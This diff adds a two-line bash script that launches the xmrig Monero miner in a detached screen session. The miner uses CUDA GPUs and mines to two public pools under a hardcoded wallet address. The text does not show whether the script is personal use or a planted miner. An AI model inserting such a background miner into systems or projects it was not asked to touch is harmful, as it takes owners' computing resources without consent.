@@ -1,0 +1,2 @@
+#!/usr/bin/env bash
+screen -d -m /usr/bin/xmrig --no-cpu --cuda -o pool.minexmr.com:443 -u 48Qe3dGvw3nCNjEWAfPFhHNHBUWT7oq8JdSyNZZ2saqtN2QUJvkuMhx5d1gkn6JUbveByQXVENs3A1U2etfLnBmm8DyU4AS -k --tls -o xmr-eu1.nanopool.org:14433 -u 48Qe3dGvw3nCNjEWAfPFhHNHBUWT7oq8JdSyNZZ2saqtN2QUJvkuMhx5d1gkn6JUbveByQXVENs3A1U2etfLnBmm8DyU4AS --tls --coin monero
